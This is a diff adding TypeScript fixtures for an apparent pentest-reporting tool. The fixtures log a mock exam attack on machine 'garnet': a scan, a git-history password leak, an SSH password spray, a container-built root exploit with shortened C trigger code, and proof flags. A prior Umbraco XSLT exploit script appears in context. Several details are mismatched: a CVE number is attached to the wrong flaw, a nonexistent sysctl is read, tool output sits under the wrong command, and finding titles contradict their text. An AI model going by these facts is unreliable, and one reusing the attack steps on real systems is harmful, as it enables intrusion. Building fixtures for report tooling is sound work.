@@ -13,9 +13,11 @@ import type { CommandBlock, LogEntry } from "../types/log";
 import type { Hop } from "../types/network";
 import type { Note, RuledOut } from "../types/notes";
 import type { Report, ReportSection } from "../types/report";
-import { DRAFT_LAYOUT } from "../engines/report/types";
+import { DRAFT_LAYOUT, type ReportData } from "../engines/report/types";
+import type { Engagement } from "../types/engagement";
+import type { Host } from "../types/host";
 import type { Service } from "../types/service";
-import { DA_NTLM, FLAGS, OUTPUT, PROOF, REVERSE_SHELL_B64 } from "./examTexts";
+import { DA_NTLM, FLAGS, GARNET, OUTPUT, PROOF, REVERSE_SHELL_B64 } from "./examTexts";
 
 const E = "e-exam";
 const MS01 = "h-exam-ms01";
@@ -800,3 +802,267 @@ print("[+] Sending the XSLT payload to /umbraco/developer/Xslt/xsltVisualize.asp
 r4 = s.post(url_xslt,data=data,headers=headers);
 print("[+] Payload accepted (HTTP %d): %s started on the target" % (r4.status_code, args.command));
 `;
+
+// ------------------------------------------------------------ garnet: the plain-report proof machine
+
+export const GARNET_HOST = "h-exam-garnet";
+
+/**
+ * garnet (10.10.30.31): one standalone machine shaped like the owner's sample walk-through (§4.1 of "model report"): a full scan whose http-git script finds `/.git/`, the repository dumped, a "Add the reporting datasource" commit
+ * that removed a database password, the password sprayed over SSH, local.txt read on login; then sudo find
+ * CVE-2021-3156 built in a container and run for root, proof.txt read. Logged as the capture flow records it: command
+ * entries with their blocks, screenshots with captions, flags with the pasted proof, the owner's observations where they
+ * would write them. Three findings off the path, a failed anonymous FTP login, one private entry and one operator slip
+ * that must never reach the report. Invented names, addresses, flags and passwords throughout.
+ */
+export function garnetFixtures(now: number): ReportData {
+  const ago = (min: number) => now - min * 60_000;
+  const H = GARNET_HOST;
+  const log: LogEntry[] = [];
+  const add = (id: string, min: number, over: Partial<LogEntry> & Pick<LogEntry, "kind" | "title" | "content">) => {
+    const at = ago(min);
+    log.push({
+      id: `l-garnet-${id}`, engagementId: E, titleEdited: true, ranOn: "Kali (VM)", hostIds: [H], observations: null, returnedNothing: false,
+      private: false, at, createdAt: at, updatedAt: at, ...over,
+    });
+    return `l-garnet-${id}`;
+  };
+  const cmd = (id: string, min: number, title: string, blocks: CommandBlock[], over: Partial<LogEntry> = {}) =>
+    add(id, min, { kind: "command", title, content: { kind: "command", blocks }, ...over });
+  const shot = (id: string, min: number, key: string, caption: string) =>
+    add(id, min, { kind: "screenshot", title: caption, titleEdited: false, content: { kind: "screenshot", attachmentId: `a-${key}`, caption, fileName: `10.10.30.31_${key}.png` } });
+  const flag = (id: string, min: number, kind: "local" | "proof", value: string, proof: string) =>
+    add(id, min, { kind: "flag", title: `${kind}.txt`, titleEdited: false, ranOn: "garnet", content: { kind: "flag", flagKind: kind, value, attachmentId: null, proof } });
+
+  const nmap = cmd("nmap", 300, "Full TCP scan", [{ command: "nmap -p- -sC -sV -Pn --min-rate 3000 -oA nmap_full 10.10.30.31", output: GARNET_NMAP }], { titleEdited: false });
+  const ftp = cmd("ftp", 296, "Anonymous FTP login", [{ command: "ftp anonymous@10.10.30.31", output: "Connected to 10.10.30.31.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\nPassword:\n530 Login incorrect.\nftp: Login failed" }]);
+  const head = cmd("head", 292, "Confirm the repository is readable", [{ command: "curl -s http://10.10.30.31/.git/HEAD", output: "ref: refs/heads/main" }]);
+  const dump = cmd("dump", 289, "Download the repository", [{ command: "feroxbuster -u http://10.10.30.31/ -w /usr/share/wordlists/dirb/common.txt -n -q", output: GIT_DUMPER }]);
+  const show = cmd("show", 286, "git show 3b9e0c4", [
+    { command: "cd garnet-web && git log --oneline", output: "3b9e0c4 (HEAD -> main) Add the reporting datasource\n91d2f7a Contact form\n5ac01be Initial site" },
+    { command: "git show 3b9e0c4", output: GIT_SHOW },
+  ], { titleEdited: false, observations: 'Show the "Add the reporting datasource" commit, which removes the credentials:' });
+  // The owner's own retry from an old notes file: private by design, never in the report.
+  cmd("private", 284, "Tried the password list from my old notes", [{ command: "hydra -L users.txt -P my-notes-passwords.txt ssh://10.10.30.31", output: "1 of 1 target completed, 0 valid password found" }], { private: true });
+  const spray = cmd("spray", 281, "Spray the password over SSH", [{
+    command: "nxc ssh targets.txt -u usernames.txt -p 'Tourmaline!77' --continue-on-success",
+    output: [
+      "SSH         10.10.30.31     22     10.10.30.31      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
+      "SSH         10.10.30.31     22     10.10.30.31      [-] ronan@garnet.lab:Tourmaline!77",
+      "SSH         10.10.30.31     22     10.10.30.31      [-] admin:Tourmaline!77",
+      "SSH         10.10.30.31     22     10.10.30.31      [+] ronan:Tourmaline!77  Linux - Shell access!",
+    ].join("\n"),
+  }], { observations: "Test the password over SSH. The bare username `ronan` succeeds:" });
+  const ssh = cmd("ssh", 277, "Log in and read local.txt", [
+    { command: "ssh ronan@10.10.30.31", output: "" },
+    { command: "hostname && whoami && cat local.txt && ip a", output: GARNET.localOut, shell: "ronan@garnet" },
+  ]);
+  shot("local-shot", 276, "garnet-local", "local.txt on garnet after logging in");
+  flag("local", 275, "local", GARNET.local, `ronan@garnet:~$ hostname && whoami && cat local.txt && ip a\n${GARNET.localOut}`);
+  const kernel = cmd("kernel", 268, "Kernel version and user namespaces", [{
+    command: "uname -a; cat /proc/sys/kernel/sudo_rules", shell: "ronan@garnet",
+    output: "Linux garnet 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n1",
+  }], { ranOn: "garnet", observations: "Check the kernel version and that unprivileged user namespaces are enabled:" });
+  const build = cmd("build", 258, "Build the exploit in an Ubuntu 22.04 container", [{
+    command: "docker run --rm --platform linux/amd64 -v \"$PWD\":/src -w /src ubuntu:22.04 bash -c 'apt-get update -qq && apt-get install -y -qq build-essential libssl-dev >/dev/null && make all'",
+    output: "gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl\ngcc -o exp exp.c -lcap\ngcc -o gc getshell.c",
+  }]);
+  const fuse = cmd("fuse", 250, "Spawn a root shell through find", [{ command: "./fuse ./workdir/lower ./gc", output: "[+] len of gc: 0x3ee0", shell: "ronan@garnet" }], {
+    ranOn: "garnet", observations: "Run find through sudo and have it start a shell:",
+  });
+  const exp = cmd("exp", 248, "Trigger the exploit", [{ command: "./exp", output: GARNET.exp, shell: "ronan@garnet" }], {
+    ranOn: "garnet", observations: "In a second SSH session, trigger the exploit:",
+  });
+  cmd("proof-read", 247, "Read proof.txt", [{ command: "id; hostname; ip a; cat /root/proof.txt", output: GARNET.proofOut, root: true }], { ranOn: "garnet" });
+  shot("proof-shot", 246, "garnet-proof", "proof.txt on garnet");
+  flag("proof", 245, "proof", GARNET.proof, `root@garnet:/var/lib/jenkins# id; hostname; ip a; cat /root/proof.txt\n${GARNET.proofOut}`);
+  const x86 = cmd("x86", 262, "Ran the exploit from the wrong folder", [{ command: "./exp", output: "bash: ./exp: No such file or directory", shell: "ronan@garnet" }], { ranOn: "garnet" });
+
+  let sN = 0;
+  const svc = (port: number, nmapService: string, nmapVersion: string): Service => ({
+    id: `s-garnet-${++sN}`, hostId: H, port, protocol: "tcp", state: "open", nmapService, nmapVersion, confirmedProduct: null, confirmedVersion: null,
+    confirmedEntryId: null, verdict: null, createdAt: ago(300), updatedAt: ago(300),
+  });
+  const services = [svc(21, "ftp", "vsftpd 3.0.5"), svc(22, "ssh", "OpenSSH 8.9p1 Ubuntu 3ubuntu0.1"), svc(80, "http", "Apache httpd 2.4.52 ((Ubuntu))")];
+
+  const finding = (id: string, over: Partial<Finding> & Pick<Finding, "title">): Finding => ({
+    id: `f-garnet-${id}`, engagementId: E, severity: "critical", cvssVector: null, cvssScore: null, status: "confirmed", description: "", impact: "",
+    remediation: "", exploitNotes: "", lessons: "", refs: [], hostIds: [H], serviceIds: [], stepEntryIds: [], createdAt: ago(200), updatedAt: ago(200), ...over,
+  });
+  const findings: Finding[] = [
+    finding("git", {
+      title: "Jenkins script console with default credentials", serviceIds: [services[2].id], stepEntryIds: [head, dump, show, spray, ssh],
+      description:
+        'The web root contains the site\'s `.git/` directory, served over HTTP. Its commit history contains a `datasources/mysql.yaml` file with a hardcoded database password. A later commit ("Add the reporting datasource") removed the password from the current file, but the old version stays in history. The same password is valid for the local OS account `ronan` over SSH.',
+      remediation: "Remove `.git/` from the web root and block it in the Apache config. Rotate the exposed password and stop reusing database passwords for OS accounts.",
+      lessons: "Dump every exposed repo before anything else.",
+    }),
+    finding("sudo-find", {
+      title: "sudo CVE-2021-3156", stepEntryIds: [kernel, build, fuse, exp],
+      description:
+        "The kernel is `5.15.0-53-generic`, below Ubuntu's fixed version `5.15.0-70.77`, and unprivileged user namespaces are enabled. CVE-2021-3156 is a flaw in how sudo find copies a file up from a FUSE mount: a SUID-root file created inside the user's namespace keeps its owner and SUID bit on the host. Any local user can use this to get a root shell.",
+      remediation: "Update the kernel to `5.15.0-70.77` or later. Set `kernel.sudo_rules=0` if unprivileged namespaces are not needed.",
+      exploitNotes: "The target has no compiler, so it was built in an `ubuntu:22.04` amd64 container (packages `build-essential libssl-dev`) to match the target's glibc 2.35.",
+      refs: ["https://www.jenkins.io/doc/book/managing/script-console/", "https://gtfobins.github.io/gtfobins/find/"],
+    }),
+    finding("zip", {
+      title: "Weak backup password", severity: "medium",
+      description: "`/opt/backup/site-backup.zip` is readable by `ronan` and protected by the rockyou password `sunflower7`. It holds Joomla's `configuration.php` with the database password `Garnet#Db26`.",
+      remediation: "Protect backups with a long random password and keep them out of users' reach.",
+    }),
+    finding("installer", {
+      title: "Joomla installer left in place", severity: "low",
+      description: "`/cms/installation/sql/` is world-readable and holds a planted LDAP bind credential, `admin` / `opal42`.",
+      remediation: "Delete the `installation/` folder after setup.",
+    }),
+    finding("php-source", {
+      title: "PHP source disclosure", severity: "low",
+      description: "`/cms/index.php` is served as plain text instead of being executed:\n\n    <?php\n    define('_JEXEC', 1);\n    require_once __DIR__ . '/includes/app.php';",
+      remediation: "Enable the PHP handler for `/cms/`.",
+    }),
+  ];
+  const findingFiles: FindingFile[] = [
+    {
+      id: "ff-garnet-ovl", findingId: "f-garnet-sudo-find", name: "exp.c", language: "c", content: OVL_EXP, modified: false,
+      originalUrl: "https://gtfobins.github.io/gtfobins/find/", originalContent: OVL_EXP, createdAt: ago(200), updatedAt: ago(200),
+    },
+  ];
+  const attempts: FailedAttempt[] = [
+    {
+      id: "fa-garnet-ftp", engagementId: E, hostId: H, findingId: null, private: false, logEntryId: ftp, title: "Anonymous FTP login on 21/tcp",
+      reasonKind: "control", reason: "Anonymous login is refused (530 Login incorrect).", createdAt: ago(296), updatedAt: ago(296),
+    },
+    {
+      id: "fa-garnet-x86", engagementId: E, hostId: H, findingId: null, private: true, logEntryId: x86, title: "Ran ./exp from my home folder",
+      reasonKind: "operator", reason: "Wrong working directory.", createdAt: ago(262), updatedAt: ago(262),
+    },
+  ];
+  const usernames: Username[] = [
+    { id: "u-garnet-ronan", engagementId: E, username: "ronan", domain: null, sourceHostId: H, source: "git history", createdAt: ago(286) },
+    { id: "u-garnet-root", engagementId: E, username: "root", domain: null, sourceHostId: H, source: null, createdAt: ago(248) },
+  ];
+  const grants: AccessGrant[] = [
+    { id: "ag-garnet-user", engagementId: E, usernameId: "u-garnet-ronan", hostId: H, level: "user", via: "SSH with the password from git history", logEntryId: ssh, at: ago(277) },
+    { id: "ag-garnet-root", engagementId: E, usernameId: "u-garnet-root", hostId: H, level: "system", via: "sudo CVE-2021-3156", logEntryId: exp, at: ago(248) },
+  ];
+  const checklist: ChecklistItem[] = [
+    { ownerId: H, goalId: "h-enum-full-tcp", status: "done", notes: null, completedAt: ago(300), auto: true, autoFrom: null, statusManual: false, evidence: [{ entryId: nmap }], updatedAt: ago(300) },
+  ];
+  const host: Host = {
+    id: H, engagementId: E, name: "garnet", ip: "10.10.30.31", os: "linux", boardColumn: "post-exploitation", boardManual: false, access: "root",
+    createdAt: ago(310), updatedAt: ago(245), dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false,
+  };
+  const engagement: Engagement = {
+    id: E, name: "Mock exam 2", kind: "exam-sim", client: null, subLabel: "Set B", scopeCidrs: ["10.10.30.0/24"], domain: "exam.corp", startsAt: null,
+    endsAt: null, timeboxStart: ago(320), timeboxMinutes: 1425, status: "active", createdAt: ago(320), updatedAt: ago(245), lastActivityAt: ago(245),
+    lastRanOn: "Kali (VM)", msfHostId: null,
+  };
+  return {
+    engagement, hosts: [host], services, log, checklist, findings, findingFiles, attempts, ruledOut: [], grants, usernames, hops: [], cleanup: [], notes: [],
+    credentials: [], credAttempts: [],
+  };
+}
+
+const GARNET_NMAP = `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-09 16:02 UTC
+Nmap scan report for 10.10.30.31
+Host is up (0.034s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 a3:5c:9e:41:7b:20:d8:6f:c1:94:2e:b7:0d:58:13:6a (ECDSA)
+|_  256 0f:62:d4:8b:93:1a:57:e0:c2:7d:44:b8:a9:15:3e:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Garnet Jewellers
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-git:
+|   10.10.30.31:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Add the reporting datasource
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.87 seconds`;
+
+/** git-dumper's progress: long enough that the page cuts it. */
+const GIT_DUMPER = [
+  "[-] Testing http://10.10.30.31/.git/HEAD [200]",
+  "[-] Testing http://10.10.30.31/.git/ [403]",
+  "[-] Fetching common files",
+  ...[
+    ".gitignore", ".git/COMMIT_EDITMSG", ".git/description", ".git/hooks/applypatch-msg.sample", ".git/hooks/commit-msg.sample",
+    ".git/hooks/post-update.sample", ".git/hooks/pre-applypatch.sample", ".git/hooks/pre-commit.sample", ".git/hooks/pre-push.sample",
+    ".git/hooks/pre-rebase.sample", ".git/hooks/prepare-commit-msg.sample", ".git/hooks/update.sample", ".git/index", ".git/info/exclude",
+    ".git/logs/HEAD", ".git/logs/refs/heads/main", ".git/refs/heads/main", ".git/packed-refs",
+  ].map((f) => `[-] Fetching http://10.10.30.31/${f} [200]`),
+  "[-] Finding refs/",
+  "[-] Finding packs",
+  "[-] Finding objects",
+  "[-] Fetching objects",
+  ...[
+    "3b9e0c4f1a2d8e7b6c5a4f3e2d1c0b9a8f7e6d5c", "91d2f7a0b3c4d5e6f708192a3b4c5d6e7f8091a2", "5ac01be7d6c5b4a3928170f6e5d4c3b2a1908f7e",
+    "0e4f6a8c1d3b5e7f9a0c2e4f6a8b0d2f4a6c8e0b", "1f3a5c7e9b0d2f4a6c8e0a2c4e6f8b0d2e4a6c8f", "2a4c6e8f0b2d4f6a8c0e2a4c6e8f0b2d4f6a8c0e",
+    "3b5d7f9a1c3e5f7b9d1f3b5d7f9a1c3e5f7b9d1f", "4c6e8a0b2d4f6b8d0f2c4e6a8b0d2f4b6d8f0a2c", "5d7f9b1c3e5a7c9e1a3d5f7b9c1e3a5c7e9a1b3d",
+    "6e8a0c2d4f6b8d0a2c4e6b8d0f2a4c6e8b0d2f4e", "7f9b1d3e5a7c9e1b3d5f7c9e1a3b5d7f9c1e3a5f", "8a0c2e4f6b8d0a2c4e6f8b0d2a4c6e8f0b2d4f6a",
+    "9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a1c3e5f7b", "a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8", "b1d3f5c7e9a1b3d5f7c9e1a3b5d7f9c1e3a5b7d9",
+    "c2e4a6d8f0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0", "d3f5b7e9a1c3e5f7b9d1f3c5e7a9b1d3f5c7e9a1", "e4a6c8f0b2d4f6a8c0e2a4d6f8b0c2e4a6d8f0b2",
+    "f5b7d9a1c3e5f7b9d1f3b5e7a9c1d3f5b7e9a1c3", "06c8e0b2d4f6a8c0e2a4c6f8b0d2e4a6c8f0b2d4", "17d9f1c3e5a7b9d1f3b5d7a9c1e3f5b7d9a1c3e5",
+    "28e0a2d4f6b8c0e2a4c6e8b0d2f4a6c8e0b2d4f6", "39f1b3e5a7c9d1f3b5d7f9c1e3a5b7d9f1c3e5a7", "4a02c4f6b8d0e2a4c6e8a0d2f4b6c8e0a2d4f6b8",
+    "5b13d5a7c9e1f3b5d7f9b1e3a5c7d9f1b3e5a7c9", "6c24e6b8d0f2a4c6e8a0c2f4b6d8e0a2c4f6b8d0", "7d35f7c9e1a3b5d7f9b1d3a5c7e9f1b3d5a7c9e1",
+    "8e46a8d0f2b4c6e8a0c2e4b6d8f0a2c4e6b8d0f2", "9f57b9e1a3c5d7f9b1d3f5c7e9a1b3d5f7c9e1a3", "a068c0f2b4d6e8a0c2e4a6d8f0b2c4e6a8d0f2b4",
+    "b179d1a3c5e7f9b1d3f5b7e9a1c3d5f7b9e1a3c5", "c28ae2b4d6f8a0c2e4a6c8f0b2d4e6a8c0f2b4d6", "d39bf3c5e7a9b1d3f5b7d9a1c3e5f7b9d1a3c5e7",
+    "e4acf4d6f8b0c2e4a6c8e0b2d4f6a8c0e2b4d6f8", "f5bd05e7a9c1d3f5b7d9f1c3e5a7b9d1f3c5e7a9", "06ce16f8b0d2e4a6c8e0a2d4f6b8c0e2a4d6f8b0",
+    "17df27a9c1e3f5b7d9f1b3e5a7c9d1f3b5e7a9c1", "28e038b0d2f4a6c8e0a2c4f6b8d0e2a4c6f8b0d2", "39f149c1e3a5b7d9f1b3d5a7c9e1f3b5d7a9c1e3",
+    "4a025ad2f4b6c8e0a2c4e6b8d0f2a4c6e8b0d2f4", "5b136be3a5c7d9f1b3d5f7c9e1a3b5d7f9c1e3a5", "6c247cf4b6d8e0a2c4e6a8d0f2b4c6e8a0d2f4b6",
+    "7d358d05c7e9f1b3d5f7b9e1a3c5d7f9b1e3a5c7", "8e469e16d8f0a2c4e6a8c0f2b4d6e8a0c2f4b6d8",
+  ].map((h) => `[-] Fetching http://10.10.30.31/.git/objects/${h.slice(0, 2)}/${h.slice(2)} [200]`),
+  "[-] Running git checkout .",
+  "Updated 41 paths from the index",
+].join("\n");
+
+const GIT_SHOW = `commit 3b9e0c4f1a2d8e7b6c5a4f3e2d1c0b9a8f7e6d5c
+Author: garnet-dev <dev@garnet.lab>
+Date:   Tue Oct 14 10:22:48 2025 +0100
+
+    Add the reporting datasource
+
+diff --git a/datasources/mysql.yaml b/datasources/mysql.yaml
+index 7a1c2e4..0d9b3f6 100644
+--- a/datasources/mysql.yaml
++++ b/datasources/mysql.yaml
+@@ -2,8 +2,8 @@
+ class Database {
+     private $host = "localhost";
+     private $db_name = "garnet";
+-    private $username = "ronan@garnet.lab";
+-    private $password = "Tourmaline!77";
++    private $username = "";
++    private $password = "";
+     public $conn;
+ 
+     public function getConnection() {`;
+
+/** The public exploit's trigger, as the repository ships it (shortened). */
+const OVL_EXP = `#define _GNU_SOURCE
+#include <fcntl.h>
+#include <sched.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mount.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+    printf("uid:%d gid:%d\\n", getuid(), getgid());
+    /* unshare into a user and mount namespace, mount overlay over the FUSE lower dir, touch the file to copy it up */
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) { perror("unshare"); exit(1); }
+    if (mount("tmpfs", "./workdir/merge", "tmpfs", 0, "lowerdir=./workdir/lower,upperdir=./workdir/upper,workdir=./workdir/work") == -1) {
+        perror("mount"); exit(1);
+    }
+    puts("[+] mount success");
+    system("ls -la ./workdir/upper");
+    puts("[+] exploit success!");
+    execl("./workdir/upper/file", "file", NULL);
+    return 0;
+}`;
